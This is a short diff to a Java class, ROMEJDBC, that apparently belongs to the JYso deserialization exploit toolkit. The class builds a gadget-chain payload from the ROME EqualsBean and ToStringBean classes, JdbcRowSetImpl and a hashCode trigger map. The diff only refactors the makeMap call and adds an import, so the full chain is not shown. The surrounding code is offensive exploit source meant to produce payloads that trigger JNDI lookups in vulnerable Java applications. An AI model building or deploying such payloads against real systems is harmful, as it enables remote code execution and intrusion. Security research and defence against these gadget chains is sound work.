@@ -5,6 +5,8 @@ import com.rometools.rome.feed.impl.EqualsBean;
 import com.rometools.rome.feed.impl.ToStringBean;
 import com.sun.rowset.JdbcRowSetImpl;
 
+import static com.qi4l.JYso.gadgets.utils.Utils.makeMap;
+
 
 public class ROMEJDBC implements ObjectPayload<Object> {
     // Assuming JDKUtil class with makeJNDIRowSet method
@@ -29,7 +31,7 @@ public class ROMEJDBC implements ObjectPayload<Object> {
     }
 
     public Object makeHashCodeTrigger(Object o1) throws Exception {
-        return JDKUtil.makeMap(o1, o1); // Assuming JDKUtil.makeMap returns a Map or similar object
+        return makeMap(o1, o1); // Assuming JDKUtil.makeMap returns a Map or similar object
     }
 
 }
